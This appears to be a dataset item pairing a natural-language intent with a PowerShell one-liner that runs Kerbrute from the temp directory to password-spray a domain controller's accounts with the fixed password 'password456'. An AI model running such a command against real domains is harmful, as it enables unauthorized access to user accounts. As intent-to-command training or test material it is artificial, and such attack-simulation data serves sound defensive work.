# Natural language intent:
# Change directory to temp and execute Kerbrute to perform a password spray attack against a domain controller.

cd $env:temp ; .\kerbrute.exe passwordspray --dc ${DomainController} -d ${Domain} $env:temp\PasswordSpray.txt password456
